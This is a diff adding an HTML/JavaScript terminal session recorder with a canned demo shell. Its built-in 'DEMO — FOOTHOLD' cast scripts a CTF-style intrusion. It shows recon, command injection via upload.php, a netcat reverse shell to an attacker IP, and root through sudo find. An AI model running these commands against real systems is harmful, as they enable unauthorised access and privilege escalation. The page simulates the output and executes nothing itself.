@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MOTHER — SESSION RECORDER</title>
+<link rel="stylesheet" href="mother.css">
+<style>
+  /* ═══════════════════════════════════════════════════════════════
+     SESSION RECORDER · SYS.12 — asciinema-style terminal
+     recorder / replayer. Module-specific CSS only.
+     ═══════════════════════════════════════════════════════════════ */
+  .m-body.split-2 { grid-template-columns:1fr 300px; }
+  .stage { display:flex; flex-direction:column; min-height:0; }
+
+  .toolbar { display:flex; align-items:center; gap:6px; padding:8px 12px;
+    border-bottom:1px solid var(--border); background:var(--bg-panel); flex-wrap:wrap; }
+  .toolbar .sep { width:1px; height:20px; background:var(--border-dim); margin:0 4px; }
+  .toolbar .rec-dot { color:var(--alert); }
+  .toolbar label { margin-left:auto; }
+  .toolbar select { width:auto; }
+  .rec-indicator { font-size:9px; letter-spacing:0.14em; text-transform:uppercase; padding:2px 8px;
+    border:1px solid var(--border-dim); color:var(--phos-dim); }
+  .rec-indicator.on { color:var(--alert); border-color:var(--alert); animation:recpulse 1.2s ease infinite; }
+  .rec-indicator.play { color:var(--holo); border-color:rgba(0,200,255,0.5); }
+  @keyframes recpulse { 50%{ opacity:0.35; } }
+
+  .term-wrap { flex:1; min-height:0; padding:12px; background:var(--bg-deep); overflow:hidden; display:flex; }
+  .term { flex:1; background:#000; border:1px solid var(--border); min-height:0;
+    overflow-y:auto; padding:12px 14px; font-family:var(--font); font-size:13px; line-height:1.45;
+    color:var(--phos); text-shadow:0 0 4px rgba(51,255,51,0.35); white-space:pre-wrap; word-break:break-word; }
+  #term-text .cmd { color:var(--phos-br); }
+  .cursor { display:inline-block; width:8px; height:15px; background:var(--phos);
+    animation:blink 1s step-end infinite; vertical-align:text-bottom; box-shadow:var(--glow); }
+  @keyframes blink { 50% { opacity:0; } }
+
+  .rec-line { display:none; align-items:center; gap:6px; padding:8px 12px; border-top:1px solid var(--border);
+    background:var(--bg-panel); }
+  .rec-line.on { display:flex; }
+  .rec-line .prompt { font-size:12px; color:var(--phos-dim); white-space:nowrap; }
+  .rec-line input { flex:1; font-size:13px; border-color:var(--phos-dim); }
+
+  .cast-list { overflow:auto; }
+  .cast-row { padding:9px 12px; border-bottom:1px solid var(--border-dim); cursor:pointer; }
+  .cast-row:hover { background:rgba(51,255,51,0.05); }
+  .cast-row.sel { background:rgba(0,200,255,0.08); border-left:2px solid var(--holo); }
+  .cast-row__name { font-size:11px; color:var(--phos-br); letter-spacing:0.04em; display:flex; align-items:center; gap:6px; }
+  .cast-row.sel .cast-row__name { color:var(--holo); }
+  .cast-row__meta { font-size:8px; color:var(--phos-dim); letter-spacing:0.08em; margin-top:3px; text-transform:uppercase; }
+  .cast-row__acts { display:flex; gap:5px; margin-top:7px; }
+  .cast-row__acts .copy-btn { font-size:9px; letter-spacing:0.06em; }
+</style>
+</head>
+<body>
+  <header class="m-header">
+    <div class="m-brand">SESSION RECORDER<small>MOTHER · SYS.12 · TERMINAL CAST ENGINE</small></div>
+    <div class="m-stats">
+      <div class="m-stat">Casts<b id="s-casts">0</b></div>
+      <div class="m-stat">Events<b id="s-events">0</b></div>
+      <div class="m-stat">Duration<b id="s-dur" class="mono">0.0s</b></div>
+      <div class="m-stat">State<b id="s-state" class="holo">IDLE</b></div>
+    </div>
+    <div class="m-haz"></div>
+    <div class="m-stat" style="text-align:right;">Clock<b id="s-clock" class="mono">--:--:--</b></div>
+  </header>
+
+  <div class="m-body split-2">
+    <section class="pane stage">
+      <div class="toolbar">
+        <button class="btn btn--alert" id="btn-rec"><span class="rec-dot">●</span> RECORD</button>
+        <button class="btn btn--ghost" id="btn-recstop">■ STOP</button>
+        <span class="sep"></span>
+        <button class="btn btn--holo" id="btn-play">▶ PLAY</button>
+        <button class="btn btn--ghost" id="btn-playstop">⏹ HALT</button>
+        <span class="sep"></span>
+        <span class="rec-indicator" id="indicator">READY</span>
+        <label for="speed">SPEED</label>
+        <select id="speed">
+          <option value="0.5">0.5x</option>
+          <option value="1" selected>1x</option>
+          <option value="2">2x</option>
+          <option value="4">4x</option>
+        </select>
+      </div>
+
+      <div class="term-wrap">
+        <div class="term" id="term">
+          <span id="term-text"></span><span class="cursor" id="cursor"></span>
+        </div>
+      </div>
+
+      <div class="rec-line" id="rec-line">
+        <span class="prompt" id="rec-prompt">www-data@target:/var/www$</span>
+        <input id="rec-input" autocomplete="off" spellcheck="false" placeholder="type a command… (nmap, ls, whoami, id, gobuster, cat /etc/passwd, msfconsole)">
+      </div>
+    </section>
+
+    <aside class="pane pane--panel">
+      <div class="sec">
+        <div class="sec__title bracket">SAVED CASTS</div>
+        <div class="dim" style="font-size:9px; line-height:1.7; letter-spacing:0.06em;">
+          RECORD a shell session, STOP to save.<br>
+          PLAY replays with recorded timing.<br>
+          EXPORT copies cast JSON.
+        </div>
+      </div>
+      <div class="cast-list" id="cast-list"></div>
+    </aside>
+  </div>
+
+  <script>
+  'use strict';
+  const $ = (id) => document.getElementById(id);
+  const LS_CASTS = 'mother.sessionrec.casts.v1';
+  const REC_PROMPT = 'www-data@target:/var/www$ ';
+
+  function esc(s){ return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
+
+  /* ── Terminal surface ───────────────────────────────────────── */
+  const term = $('term'), termText = $('term-text');
+  function clearTerm(){ termText.innerHTML = ''; }
+  function scrollBottom(){ term.scrollTop = term.scrollHeight; }
+  function appendChunk(text, cls){
+    const span = document.createElement('span');
+    if (cls) span.className = cls;
+    span.textContent = text;
+    termText.appendChild(span);
+    scrollBottom();
+  }
+  // Type a string out char-by-char. Guarded by a generation token.
+  function typeOut(text, perChar, gen, genRef, done){
+    const span = document.createElement('span');
+    span.className = 'cmd';
+    termText.appendChild(span);
+    let i = 0;
+    (function next(){
+      if (gen !== genRef.v) return;            // cancelled
+      if (i >= text.length){ scrollBottom(); done(); return; }
+      span.textContent += text[i++];
+      scrollBottom();
+      setTimeout(next, perChar);
+    })();
+  }
+
+  /* ══════════════════════════════════════════════════════════════
+     Canned shell — realistic output for known commands.
+     ══════════════════════════════════════════════════════════════ */
+  function cannedOutput(raw){
+    const cmd = raw.trim();
+    const c = cmd.toLowerCase();
+    if (c === '') return '';
+    if (c === 'clear'){ clearTerm(); return ''; }
+    if (c === 'whoami') return 'www-data\n';
+    if (c === 'id') return 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n';
+    if (c === 'pwd') return '/var/www\n';
+    if (c === 'hostname') return 'target\n';
+    if (c === 'uname -a') return 'Linux target 5.4.0-150-generic #167-Ubuntu SMP x86_64 GNU/Linux\n';
+    if (c === 'ls' || c.startsWith('ls '))
+      return 'html  cgi-bin  backup.sh  .config  uploads\n';
+    if (c === 'cat /etc/passwd')
+      return 'root:x:0:0:root:/root:/bin/bash\n' +
+             'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n' +
+             'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n' +
+             'mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false\n' +
+             'devops:x:1000:1000:devops:/home/devops:/bin/bash\n';
+    if (c === 'sudo -l')
+      return 'Matching Defaults entries for www-data on target:\n' +
+             '    env_reset, mail_badpass\n\n' +
+             'User www-data may run the following commands on target:\n' +
+             '    (ALL) NOPASSWD: /usr/bin/find\n';
+    if (c.startsWith('nmap'))
+      return 'Starting Nmap 7.94 ( https://nmap.org )\n' +
+             'Nmap scan report for 10.10.14.22\n' +
+             'Host is up (0.011s latency).\n' +
+             'PORT     STATE SERVICE VERSION\n' +
+             '22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu\n' +
+             '80/tcp   open  http    Apache httpd 2.4.41\n' +
+             '3306/tcp open  mysql   MySQL 5.7.38\n' +
+             'Nmap done: 1 IP address (1 host up) scanned in 8.44s\n';
+    if (c.startsWith('gobuster'))
+      return '===============================================================\n' +
+             'Gobuster v3.6\n' +
+             '===============================================================\n' +
+             '/images              (Status: 301) [Size: 313]\n' +
+             '/uploads             (Status: 301) [Size: 314]\n' +
+             '/admin               (Status: 301) [Size: 313]\n' +
+             '/dev                 (Status: 200) [Size: 4021]\n' +
+             'Finished\n';
+    if (c.startsWith('msfconsole') || c.startsWith('msf'))
+      return '       =[ metasploit v6.4.7-dev                          ]\n' +
+             '+ -- --=[ 2398 exploits - 1235 auxiliary - 422 post       ]\n' +
+             '+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]\n' +
+             'msf6 > \n';
+    if (c === 'ps' || c.startsWith('ps '))
+      return '  PID TTY          TIME CMD\n' +
+             ' 1042 pts/1    00:00:00 apache2\n' +
+             ' 1180 pts/1    00:00:00 bash\n' +
+             ' 1195 pts/1    00:00:00 ps\n';
+    if (c === 'netstat -tulpn' || c.startsWith('ss'))
+      return 'Proto Local Address       State\n' +
+             'tcp   0.0.0.0:22            LISTEN\n' +
+             'tcp   0.0.0.0:80            LISTEN\n' +
+             'tcp   127.0.0.1:3306        LISTEN\n';
+    if (c === 'ifconfig' || c === 'ip a' || c === 'ip addr')
+      return 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>\n' +
+             '      inet 10.10.14.22  netmask 255.255.255.0\n' +
+             '      ether 02:42:0a:0a:0e:16  txqueuelen 1000\n';
+    if (c === 'help')
+      return 'known demo cmds: nmap ls whoami id pwd hostname uname -a\n' +
+             '                 cat /etc/passwd sudo -l gobuster msfconsole\n' +
+             '                 ps netstat -tulpn ifconfig clear\n';
+    return c.split(' ')[0] + ': command not found\n';
+  }
+
+  /* ══════════════════════════════════════════════════════════════
+     Pre-seeded SHOWPIECE cast — "DEMO — FOOTHOLD"
+     Built from constant delays (no Math.random / Date.now).
+     ══════════════════════════════════════════════════════════════ */
+  const DEMO_STEPS = [
+    { d:300,  cmd:true, data:'attacker@kali:~$ nmap -sV -T4 10.10.14.22\n' },
+    { d:850,  data:'Starting Nmap 7.94 ( https://nmap.org )\n' },
+    { d:650,  data:'Nmap scan report for 10.10.14.22\nHost is up (0.012s latency).\n' },
+    { d:450,  data:'PORT     STATE SERVICE VERSION\n' },
+    { d:350,  data:'22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu\n' },
+    { d:300,  data:'80/tcp   open  http    Apache httpd 2.4.41\n' },
+    { d:300,  data:'3306/tcp open  mysql   MySQL 5.7.38\n' },
+    { d:600,  data:'Nmap done: 1 IP address (1 host up) scanned in 8.44s\n\n' },
+    { d:1150, cmd:true, data:'attacker@kali:~$ gobuster dir -u http://10.10.14.22 -w common.txt\n' },
+    { d:800,  data:'===============================================================\nGobuster v3.6\n===============================================================\n' },
+    { d:500,  data:'/images              (Status: 301) [Size: 313]\n' },
+    { d:450,  data:'/uploads             (Status: 301) [Size: 314]\n' },
+    { d:450,  data:'/admin               (Status: 301) [Size: 313]\n' },
+    { d:500,  data:'/dev                 (Status: 200) [Size: 4021]\n' },
+    { d:400,  data:'Finished\n\n' },
+    { d:1200, cmd:true, data:'attacker@kali:~$ curl -s "http://10.10.14.22/dev/upload.php?cmd=id"\n' },
+    { d:700,  data:'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n' },
+    { d:950,  cmd:true, data:'attacker@kali:~$ curl "http://10.10.14.22/dev/upload.php?cmd=nc+-e+/bin/bash+10.10.14.5+4444"\n' },
+    { d:600,  data:'[*] payload delivered — awaiting callback...\n\n' },
+    { d:1000, cmd:true, data:'attacker@kali:~$ nc -lvnp 4444\n' },
+    { d:900,  data:'listening on [any] 4444 ...\n' },
+    { d:1100, data:'connect to [10.10.14.5] from (UNKNOWN) [10.10.14.22] 43122\n' },
+    { d:500,  data:'bash: cannot set terminal process group (1042): Inappropriate ioctl for device\nbash: no job control in this shell\n' },
+    { d:800,  cmd:true, data:'www-data@target:/var/www/html/dev$ whoami\n' },
+    { d:400,  data:'www-data\n' },
+    { d:650,  cmd:true, data:'www-data@target:/var/www/html/dev$ id\n' },
+    { d:400,  data:'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n' },
+    { d:1050, cmd:true, data:'www-data@target:/var/www/html/dev$ ./linpeas.sh | head -n 12\n' },
+    { d:900,  data:'  +-----------------------------+\n  |   LinPEAS  v3.1  quickscan  |\n  +-----------------------------+\n' },
+    { d:500,  data:'[+] OS: Ubuntu 20.04.6 LTS (Focal)\n' },
+    { d:400,  data:'[+] Sudo version 1.8.31\n' },
+    { d:450,  data:'[+] Kernel: 5.4.0-150-generic\n' },
+    { d:550,  data:'[!] Checking sudo -l ...\n' },
+    { d:600,  data:'[!] SUDO MISCONFIG -> (ALL) NOPASSWD: /usr/bin/find\n' },
+    { d:1300, cmd:true, data:'www-data@target:/var/www/html/dev$ sudo find . -exec /bin/sh \\; -quit\n' },
+    { d:800,  cmd:true, data:'# id\n' },
+    { d:400,  data:'uid=0(root) gid=0(root) groups=0(root)\n' },
+    { d:650,  cmd:true, data:'# whoami\n' },
+    { d:350,  data:'root\n' },
+    { d:700,  cmd:true, data:'# cat /root/root.txt\n' },
+    { d:500,  data:'a1b2c3d4e5f60718293a4b5c6d7e8f90\n' },
+    { d:600,  data:'[*] ROOT — foothold complete.\n' },
+  ];
+  function buildDemoCast(){
+    let t = 0;
+    const events = DEMO_STEPS.map(s => { t += s.d; return { tMs:t, data:s.data, cmd:!!s.cmd }; });
+    return { id:'demo-foothold', name:'DEMO — FOOTHOLD', seed:true, events };
+  }
+  const DEMO_CAST = buildDemoCast();
+
+  /* ══════════════════════════════════════════════════════════════
+     Cast storage
+     ══════════════════════════════════════════════════════════════ */
+  function loadUserCasts(){
+    try { const c = JSON.parse(localStorage.getItem(LS_CASTS)); if (Array.isArray(c)) return c; }
+    catch(e){}
+    return [];
+  }
+  function saveUserCasts(){ localStorage.setItem(LS_CASTS, JSON.stringify(userCasts)); }
+  let userCasts = loadUserCasts();
+  function allCasts(){ return [DEMO_CAST, ...userCasts]; }
+  function castById(id){ return allCasts().find(c => c.id === id); }
+
+  let selectedId = DEMO_CAST.id;
+  let castSeq = 0;
+  function nextCastId(){
+    let n = userCasts.length + 1, id;
+    do { id = 'session-' + String(n).padStart(2,'0'); n++; } while (castById(id));
+    return id;
+  }
+
+  function castDurationMs(cast){ return cast.events.length ? cast.events[cast.events.length-1].tMs : 0; }
+  function fmtDur(ms){ return (ms/1000).toFixed(1) + 's'; }
+
+  function renderCastList(){
+    const el = $('cast-list');
+    const casts = allCasts();
+    $('s-casts').textContent = casts.length;
+    el.innerHTML = casts.map(c => {
+      const dur = castDurationMs(c);
+      const badge = c.seed ? '<span class="tag tag--holo">DEMO</span>' : '';
+      const delBtn = c.seed ? '' : '<button class="copy-btn" data-act="del" style="color:var(--alert);border-color:rgba(255,68,51,0.4);">✕ DEL</button>';
+      return `<div class="cast-row ${c.id===selectedId?'sel':''}" data-id="${c.id}">
+        <div class="cast-row__name">${esc(c.name)} ${badge}</div>
+        <div class="cast-row__meta">${fmtDur(dur)} · ${c.events.length} events</div>
+        <div class="cast-row__acts">
+          <button class="copy-btn" data-act="play">▶ PLAY</button>
+          <button class="copy-btn" data-act="export">⧉ EXPORT</button>
+          ${delBtn}
+        </div>
+      </div>`;
+    }).join('');
+    el.querySelectorAll('.cast-row').forEach(row => {
+      const id = row.dataset.id;
+      row.addEventListener('click', e => { if (e.target.closest('.copy-btn')) return; selectCast(id); });
+      const play = row.querySelector('[data-act="play"]');
+      const exp = row.querySelector('[data-act="export"]');
+      const del = row.querySelector('[data-act="del"]');
+      play.addEventListener('click', () => { selectCast(id); playCast(castById(id)); });
+      exp.addEventListener('click', e => {
+        const c = castById(id);
+        navigator.clipboard && navigator.clipboard.writeText(JSON.stringify(c, null, 2));
+        e.target.textContent = '✓ COPIED'; setTimeout(() => e.target.textContent = '⧉ EXPORT', 1200);
+      });
+      if (del) del.addEventListener('click', () => {
+        userCasts = userCasts.filter(c => c.id !== id); saveUserCasts();
+        if (selectedId === id) selectedId = DEMO_CAST.id;
+        renderCastList(); updateSelectedStats();
+      });
+    });
+  }
+
+  function selectCast(id){
+    selectedId = id;
+    renderCastList(); updateSelectedStats();
+  }
+  function updateSelectedStats(){
+    const c = castById(selectedId);
+    if (!c){ $('s-events').textContent = '0'; $('s-dur').textContent = '0.0s'; return; }
+    $('s-events').textContent = c.events.length;
+    $('s-dur').textContent = fmtDur(castDurationMs(c));
+  }
+
+  /* ══════════════════════════════════════════════════════════════
+     Replay engine
+     ══════════════════════════════════════════════════════════════ */
+  const genRef = { v: 0 };   // generation token; bump to cancel any in-flight play/type
+  let playing = false, playTimer = null;
+
+  function setState(txt, cls){
+    const s = $('s-state'); s.textContent = txt;
+    s.className = cls || '';
+    const ind = $('indicator');
+    ind.className = 'rec-indicator' + (cls==='alert'?' on':cls==='holo'?' play':'');
+    ind.textContent = txt === 'IDLE' ? 'READY' : txt;
+  }
+
+  function stopPlay(){
+    playing = false; genRef.v++;
+    if (playTimer){ clearTimeout(playTimer); playTimer = null; }
+    if (!recording) setState('IDLE', 'holo');
+  }
+
+  function playCast(cast){
+    if (recording) return;
+    stopPlay();
+    clearTerm();
+    playing = true;
+    const gen = ++genRef.v;
+    const speed = parseFloat($('speed').value) || 1;
+    const evs = cast.events;
+    setState('PLAY', 'holo');
+    let i = 0, prev = 0;
+    (function step(){
+      if (!playing || gen !== genRef.v) return;
+      if (i >= evs.length){ playing = false; setState('IDLE', 'holo'); return; }
+      const ev = evs[i];
+      const wait = Math.max(0, (ev.tMs - prev) / speed);
+      prev = ev.tMs;
+      playTimer = setTimeout(() => {
+        if (!playing || gen !== genRef.v) return;
+        if (ev.cmd){
+          typeOut(ev.data, Math.max(4, 20/speed), gen, genRef, () => { i++; step(); });
+        } else {
+          appendChunk(ev.data);
+          i++; step();
+        }
+      }, wait);
+    })();
+  }
+
+  /* ══════════════════════════════════════════════════════════════
+     Recording
+     ══════════════════════════════════════════════════════════════ */
+  let recording = false, recStart = 0, recEvents = [];
+
+  function startRecording(){
+    stopPlay();
+    recording = true;
+    recEvents = [];
+    clearTerm();
+    appendChunk('# session recording started — type commands, ■ STOP to save\n\n');
+    recStart = performance.now();          // performance.now() per constraint
+    $('rec-line').classList.add('on');
+    $('rec-input').focus();
+    setState('REC', 'alert');
+  }
+
+  function stopRecording(){
+    if (!recording) return;
+    recording = false;
+    $('rec-line').classList.remove('on');
+    setState('IDLE', 'holo');
+    if (!recEvents.length){ appendChunk('\n# nothing recorded — discarded\n'); return; }
+    let name = '';
+    try { name = window.prompt('Cast name:', nextCastId()) || ''; } catch(e){ name = ''; }
+    name = name.trim() || nextCastId();
+    const cast = { id: nextCastId(), name, seed:false, events: recEvents.slice() };
+    userCasts.push(cast);
+    saveUserCasts();
+    selectedId = cast.id;
+    renderCastList(); updateSelectedStats();
+    appendChunk('\n# saved as "' + name + '" (' + recEvents.length + ' events)\n');
+  }
+
+  function submitCommand(){
+    if (!recording) return;
+    const raw = $('rec-input').value;
+    $('rec-input').value = '';
+    const echo = REC_PROMPT + raw + '\n';
+    const t1 = performance.now() - recStart;
+    appendChunk(echo, 'cmd');
+    recEvents.push({ tMs: t1, data: echo, cmd: true });
+    const out = cannedOutput(raw);
+    if (out){
+      const t2 = performance.now() - recStart;
+      appendChunk(out);
+      recEvents.push({ tMs: t2, data: out, cmd: false });
+    }
+  }
+
+  $('rec-input').addEventListener('keydown', e => {
+    if (e.key === 'Enter'){ e.preventDefault(); submitCommand(); }
+  });
+
+  /* ── Controls ───────────────────────────────────────────────── */
+  $('btn-rec').addEventListener('click', startRecording);
+  $('btn-recstop').addEventListener('click', stopRecording);
+  $('btn-play').addEventListener('click', () => { const c = castById(selectedId); if (c) playCast(c); });
+  $('btn-playstop').addEventListener('click', stopPlay);
+
+  /* ── Live clock (display only) ──────────────────────────────── */
+  function tick(){
+    const d = new Date();
+    const p = n => String(n).padStart(2,'0');
+    $('s-clock').textContent = `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
+  }
+  setInterval(tick, 1000); tick();
+
+  /* ── Boot ───────────────────────────────────────────────────── */
+  renderCastList();
+  updateSelectedStats();
+  setState('IDLE', 'holo');
+  appendChunk('MU/TH/UR 6000 · SESSION CAST ENGINE ONLINE\n');
+  appendChunk('select a cast → ▶ PLAY   ·   or ● RECORD your own\n');
+  appendChunk('showpiece ready: "DEMO — FOOTHOLD"\n');
+  </script>
+</body>
+</html>
